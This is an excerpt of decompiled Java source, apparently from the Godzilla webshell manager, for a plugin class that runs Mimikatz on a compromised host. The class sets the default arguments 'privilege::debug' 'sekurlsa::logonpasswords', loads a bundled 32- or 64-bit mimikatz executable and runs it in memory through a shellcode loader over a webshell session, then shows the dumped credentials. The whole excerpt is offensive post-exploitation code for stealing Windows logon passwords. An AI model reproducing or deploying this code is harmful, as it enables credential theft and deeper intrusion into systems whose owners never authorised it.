...
/*  36 */     this.argsTextField = new JTextField(" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" ");
...
/*  55 */             Mimikatz.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
...
/*     */     } 
/*     */     
/*  78 */     byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
/*     */     
/*     */     try {
/*  81 */       byte[] result = this.loader.runPe2(this.argsTextField.getText().trim(), pe, 6000);
/*  82 */       this.resultTextArea.setText(this.encoding.Decoding(result));
/*  83 */     } catch (Exception e) {
/*  84 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
/*     */     } 
/*     */   }
/*     */   protected Payload payload; private Encoding encoding; private ShellcodeLoader loader;
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/*  90 */     this.shellEntity = shellEntity;
/*  91 */     this.payload = this.shellEntity.getPayloadModule();
/*  92 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/*  93 */     automaticBindClick.bindJButtonClick(Mimikatz.class, this, Mimikatz.class, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
...
/* Location:              /Users/h12/Documents/网安工具/gesila/godzilla.jar!/shells/plugins/generic/Mimikatz.class
